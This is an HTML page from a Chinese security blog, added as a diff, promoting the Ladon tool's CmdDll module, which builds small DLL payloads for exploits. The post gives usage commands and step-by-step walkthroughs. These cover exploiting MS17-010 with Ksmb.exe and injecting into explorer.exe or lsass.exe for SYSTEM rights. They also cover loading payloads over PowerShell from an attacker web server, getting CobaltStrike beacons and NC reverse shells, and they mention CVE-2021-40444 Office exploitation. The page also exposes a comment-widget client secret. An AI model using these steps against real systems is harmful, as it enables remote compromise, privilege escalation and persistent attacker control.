@@ -1,0 +1,396 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Ladon,dll">
+
+
+<meta name="description" content="=============================================================================================++++...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖教程〗Ladon SmbExec Hash传递远程执行命令 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+</html>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" data-original="https://img-blog.csdnimg.cn/20210117164837812.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖教程〗Ladon SmbExec Hash传递远程执行命令">
+            
+            〖教程〗Ladon SmbExec Hash传递远程执行命令
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/Ladon/" rel="tag">Ladon</a> <a class="tag-link" href="/tags/dll/" rel="tag">dll</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2021/09/20</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/cmddll.html";
+</script>
+
+
+<h3 id="Ladon8-9更新功能"><a href="#Ladon8-9更新功能" class="headerlink" title="Ladon8.9更新功能"></a>Ladon8.9更新功能</h3><p>20210920<br>[+]CmdDll Windows 0day漏洞通用DLL注入生成器，生成的DLL仅5KB，非常适0day加载</p>
+<p>2021.9.15<br>[u]webscan CS保留<br>[u]CmdDll 去除黑框</p>
+<p>2021.9.14<br>[+]CVE-2021-40444 Microsoft MSHTML远程代码执行漏洞，Office文档利用模块<br>影响版本: 包括Windows 7/8/8.1/10，Windows Server 2008/2008R2/2012/2012R2/2016/2019/2022<br>[+]CmdDll cmd转DLL(Win系统0day漏洞DLL执行命令payload，可直接powershell上线CobaltStrike)<br>   溢出漏洞如MS17010、本地提权CVE-2021-1675等，非溢出如最新的Office漏洞CVE-2021-40444等</p>
+<h3 id="CMD用法"><a href="#CMD用法" class="headerlink" title="CMD用法"></a>CMD用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">Ladon CmdDll x86 calc</span><br><span class="line">Ladon CmdDll x64 calc</span><br><span class="line">Ladon CmdDll b64x86 YwBhAGwAYwA=</span><br><span class="line">Ladon CmdDll b64x64 YwBhAGwAYwA=</span><br></pre></td></tr></table></figure>
+
+<p>PS：由于生成的DLL仅5KB，所以可执行的payload的最大长度是2000字节，基本上够用了，可执行NC反弹，CS上线，或各类powershell框架远程加载执行。</p>
+<h4 id="DLL测试"><a href="#DLL测试" class="headerlink" title="DLL测试"></a>DLL测试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">Rundll32 sc32.dll,k8</span><br><span class="line">Rundll32 sc64.dll,k8</span><br></pre></td></tr></table></figure>
+
+<p>复现0day前，测试是必须的，先保证DLL功能正常，才能拿去复现漏洞，不然你不知道是漏洞的DLL注入或DLL加载器没调好，还是DLL本身有问题，DLL启动参数是任意的，意味着不管漏洞注入导出函数是什么，都能加载，所以我们可用于多个已知漏洞或以后新出的0day漏洞测试。</p>
+<h3 id="GUI用法"><a href="#GUI用法" class="headerlink" title="GUI用法"></a>GUI用法</h3><p>由于生成DLL都是本地生成，使用CMD版比较麻烦，所以该功能添加到GUI中。用法打开LadonGUI–CmdDll模块，上文本框填写需要执行的CMD命令，CMD执行有两种方式，一是默认的CMD执行，二是PowerShell Base64加密执行，(勾选Base64Cmd),根据需要点击对应系统位数生成DLL。</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cmddll_calc.PNG"></p>
+<h4 id="弹计算器演示"><a href="#弹计算器演示" class="headerlink" title="弹计算器演示"></a>弹计算器演示</h4><p>为了方便，可以通过GUI上的TEST按钮测试DLL功能<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cmddll_calc.gif"></p>
+<h4 id="MS17010漏洞CS上线演示"><a href="#MS17010漏洞CS上线演示" class="headerlink" title="MS17010漏洞CS上线演示"></a>MS17010漏洞CS上线演示</h4><p>1 通过命令 Ladon 192.168.1.8/24 MS17010 扫描发现192.168.1.106主机存在MS17010漏洞<br>2 配置好CS监听器，使用“Web Delivery”生成powershell的URL监听<br>3 LadonGUI-CmdDLL-CS文本框填写URL，如<a href="http://192.168.1.108/a，生成x86的DLL(目标32位系统)" target="_blank" rel="noopener">http://192.168.1.108/a，生成x86的DLL(目标32位系统)</a><br>4 使用命令 Ksmb.exe 192.168.1.106 445 sc32.dll explorer.exe，远程溢出106主机并将dll注入explorer.exe,注入explorer进程得到的是当前用户权限，如果注入lsass.exe得到的是system权限，其它进程也是同理，看进程启动所使用的权限，实际测试请根据需要，如遇到不出网的情况，需添加用户注入explorer可能就会失败，因为有些机器开启UAC。</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cmddll_ms17010_cs.gif"></p>
+<h4 id="MS17010漏洞NC反弹演示"><a href="#MS17010漏洞NC反弹演示" class="headerlink" title="MS17010漏洞NC反弹演示"></a>MS17010漏洞NC反弹演示</h4><p>可能有些机器存在杀软查杀CS，导致无法直接上线CS，这时我们可使用NC或MSF上线</p>
+<p>1 通过命令 Ladon 192.168.1.8/24 MS17010 扫描发现192.168.1.106主机存在MS17010漏洞<br>2 打开LadonGui-NetCat-启动监听，默认监听本机4444端口,使用 Ladon web 800 启动WEB，在GUI里填写对应PS1的下载地址，如<a href="http://192.168.1.108:800/Ladon.ps1，实战若是需要远程内存加载其它powershell框架,下载exe、dll等文件均可使用Ladon的web模块监听" target="_blank" rel="noopener">http://192.168.1.108:800/Ladon.ps1，实战若是需要远程内存加载其它powershell框架,下载exe、dll等文件均可使用Ladon的web模块监听</a><br>3 LadonGUI-CmdDLL-填写IP和端口，生成NC x86的DLL(目标32位系统)<br>4 使用命令 Ksmb.exe 192.168.1.106 445 sc32.dll explorer.exe，远程溢出106主机，成功反弹shell</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cmddll_ms17010_nc.gif"></p>
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.9版本：K8小密圈</p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../img/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    
+    <a href="/p/CVE-2021-40444.html" class="next-post btn btn-default" title="〖EXP〗Ladon CVE-2021-40444 Office漏洞复现CS上线">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖EXP〗Ladon CVE-2021-40444 Office漏洞复现CS上线</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon8-9更新功能"><span class="toc-text">Ladon8.9更新功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD用法"><span class="toc-text">CMD用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DLL测试"><span class="toc-text">DLL测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GUI用法"><span class="toc-text">GUI用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#弹计算器演示"><span class="toc-text">弹计算器演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MS17010漏洞CS上线演示"><span class="toc-text">MS17010漏洞CS上线演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MS17010漏洞NC反弹演示"><span class="toc-text">MS17010漏洞NC反弹演示</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon下载"><span class="toc-text">Ladon下载</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+<script type="text/javascript" src="http://apps.bdimg.com/libs/jquery-lazyload/1.9.5/jquery.lazyload.min.js"></script>
+    <script type="text/javascript">
+      $(function() {        
+          $("img").lazyload({
+            placeholder:"/img/loading.gif",
+              effect:"fadeIn"
+            });
+          });
+    </script>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+</body>
